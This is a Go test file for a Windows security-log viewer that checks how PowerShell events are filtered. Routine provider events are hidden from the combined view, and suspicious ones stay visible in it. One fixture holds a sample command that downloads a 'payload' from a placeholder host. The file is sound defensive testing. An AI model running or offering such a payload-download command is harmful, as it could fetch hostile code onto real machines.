package server

import (
	"testing"

	"github.com/ruiwenya/WinTraceLens/internal/securitylog"
)

func TestSecurityCategoryMatchesHidesRoutinePowerShellFromAll(t *testing.T) {
	routine := securitylog.Event{Category: "PowerShell日志", EventID: "600", Message: "Provider started"}
	if securityCategoryMatches(routine, "all") {
		t.Fatal("routine PowerShell provider event should be hidden from all-events output")
	}
	if !securityCategoryMatches(routine, "powershell") {
		t.Fatal("routine PowerShell provider event should remain in the dedicated PowerShell view")
	}
}

func TestSecurityCategoryMatchesKeepsSuspiciousPowerShell(t *testing.T) {
	suspicious := securitylog.Event{Category: "PowerShell日志", EventID: "4103", Command: "Invoke-WebRequest https://example.invalid/payload"}
	if !securityCategoryMatches(suspicious, "all") {
		t.Fatal("suspicious PowerShell event should remain in all-events output")
	}
}
